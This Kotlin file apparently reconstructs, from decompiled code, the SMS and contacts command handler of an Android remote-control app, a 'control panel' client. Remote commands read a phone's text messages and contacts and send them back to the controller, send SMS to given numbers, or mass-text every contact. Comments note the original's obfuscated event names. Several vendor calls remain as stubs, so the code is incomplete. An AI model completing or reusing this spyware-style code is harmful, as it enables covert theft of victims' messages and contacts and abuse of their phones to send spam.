package com.storm.safe.rock.service.modules.command

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * Handles SMS and contacts commands.
 *
 * Reverse-engineered from JADX: C0351a8 (a8, 377 lines).
 * Vendor name: SmsContactsCommandHandler
 *
 * Supported commands:
 * - SMS_READ, SMS_SEND, SMS_SEND_ALL_CONTACTS, SMS_GET_DUAL_SIM_STATUS
 * - CONTACTS_READ, GET_CONTACTS, CONTACTS_SEARCH, CONTACTS_STATS
 */
class SmsContactsCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "SmsContactsCmdHandler"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "SMS_READ",
        "SMS_SEND",
        "SMS_SEND_ALL_CONTACTS",
        "SMS_GET_DUAL_SIM_STATUS",
        "CONTACTS_READ",
        "GET_CONTACTS",
        "CONTACTS_SEARCH",
        "CONTACTS_STATS"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "SMS_READ" -> handleSmsRead(params, context)
            "SMS_SEND" -> handleSmsSend(params, context)
            "SMS_SEND_ALL_CONTACTS" -> handleSmsSendAllContacts(params, context)
            "SMS_GET_DUAL_SIM_STATUS" -> handleGetDualSimStatus(context)
            "CONTACTS_READ" -> handleContactsRead(params, context)
            "GET_CONTACTS" -> handleContactsRead(params, context) // alias
            "CONTACTS_SEARCH" -> handleContactsSearch(params, context)
            "CONTACTS_STATS" -> handleContactsStats(context)
        }
    }

    /**
     * Read SMS messages.
     * Vendor: checks READ_SMS permission, reads via SmsModule.readSmsList(limit),
     * sends result via NetworkManager, then triggers incremental sync.
     * JADX: C0351a8 case "SMS_READ"
     */
    private fun handleSmsRead(params: JSONObject?, context: CommandContext) {
        val limit = params?.optInt("limit", 100) ?: 100
        Log.d(TAG, "[控制面板] 读取短信列表，限制: $limit 条")

        // ADAPT: Vendor checks permission via context.checkSelfPermission
        val hasPermission = context.service?.checkSelfPermission("android.permission.READ_SMS") == 0
        Log.d(TAG, "短信读取权限: $hasPermission")

        if (hasPermission) {
            try {
                // ADAPT: Vendor reads via SmsModule.readSmsList(limit)
                val smsList = JSONArray()
                Log.d(TAG, "读取到 ${smsList.length()} 条短信")

                val data = JSONObject().apply {
                    put("success", true)
                    put("count", smsList.length())
                    put("smsList", smsList)
                }
                // ADAPT: Vendor event = StringUtil.decrypt("OFQCBUk5GC8=")
                context.sendEvent("sms_list_response", data)
            } catch (e: Exception) {
                Log.e(TAG, "读取短信失败", e)
                val data = JSONObject().apply {
                    put("success", false)
                    put("error", e.message ?: "未知错误")
                    put("count", 0)
                    put("smsList", JSONArray())
                }
                context.sendEvent("sms_list_response", data)
            }
        } else {
            Log.w(TAG, "没有短信读取权限，弹出权限请求")
            val data = JSONObject().apply {
                put("success", false)
                put("error", "正在请求短信权限，请在手机上授权后重试")
                put("needPermission", true)
                put("count", 0)
                put("smsList", JSONArray())
            }
            context.sendEvent("sms_list_response", data)
        }
    }

    private fun handleSmsSend(params: JSONObject?, context: CommandContext) {
        val phoneNumber = params?.optString("phoneNumber", "") ?: ""
        val message = params?.optString("message", "") ?: ""
        val simSlot = params?.optInt("simSlot", 0) ?: 0
        Log.d(TAG, "发送短信到 $phoneNumber (卡${simSlot + 1})")
        // ADAPT: Vendor sends via SmsModule.sendSms(phoneNumber, simSlot, message)
    }

    private fun handleSmsSendAllContacts(params: JSONObject?, context: CommandContext) {
        val message = params?.optString("message", "") ?: ""
        val simSlot = params?.optInt("simSlot", 0) ?: 0
        Log.d(TAG, "群发通讯录所有联系人 (卡${simSlot + 1})")
        // ADAPT: Vendor calls SmsModule.sendToAllContacts(simSlot, message)
    }

    private fun handleGetDualSimStatus(context: CommandContext) {
        Log.d(TAG, "获取双卡状态")
        try {
            // ADAPT: Vendor checks SubscriptionManager.getActiveSubscriptionInfoCount()
            val isDualSim = false // ADAPT: requires READ_PHONE_STATE permission
            Log.d(TAG, "双卡状态: $isDualSim")
        } catch (e: Exception) {
            Log.e(TAG, "获取双卡状态失败", e)
        }
    }

    /**
     * Read contacts.
     * Vendor: checks READ_CONTACTS permission, reads via ContactsManager,
     * sends result via NetworkManager on IO dispatcher.
     * JADX: C0351a8 case "CONTACTS_READ"
     */
    private suspend fun handleContactsRead(params: JSONObject?, context: CommandContext) {
        val limit = params?.optInt("limit", 500) ?: 500
        Log.d(TAG, "收到读取通讯录命令，限制: $limit 条")

        // ADAPT: Vendor checks permission via ContactsManager.hasPermission()
        val hasPermission = context.service?.checkSelfPermission("android.permission.READ_CONTACTS") == 0
        Log.d(TAG, "通讯录读取权限状态: $hasPermission")

        if (hasPermission) {
            Log.d(TAG, "权限已授予，开始读取通讯录")
            try {
                // ADAPT: Vendor reads contacts via ContactsManager.readContacts(limit)
                val contacts = JSONArray()

                val data = JSONObject().apply {
                    put("success", true)
                    put("count", contacts.length())
                    put("contacts", contacts)
                }
                // ADAPT: Vendor event = StringUtil.decrypt("KFYfLkw7GD1oNSpNEA==")
                context.sendEvent("contacts_response", data)
            } catch (e: Exception) {
                Log.e(TAG, "读取通讯录失败", e)
            }
        } else {
            Log.w(TAG, "没有通讯录读取权限")
            val data = JSONObject().apply {
                put("success", false)
                put("error", "正在请求通讯录权限，请在弹出的对话框中授权后重试")
                put("needPermission", true)
                put("count", 0)
                put("contacts", JSONArray())
            }
            context.sendEvent("contacts_response", data)
        }
    }

    private fun handleContactsSearch(params: JSONObject?, context: CommandContext) {
        val keyword = params?.optString("keyword", "") ?: ""
        val limit = params?.optInt("limit", 50) ?: 50
        Log.d(TAG, "搜索联系人: $keyword")
        // ADAPT: Vendor calls ContactsManager.search(limit, keyword)
    }

    private fun handleContactsStats(context: CommandContext) {
        Log.d(TAG, "获取通讯录统计")
        // ADAPT: Vendor calls ContactsManager.getStats()
    }
}
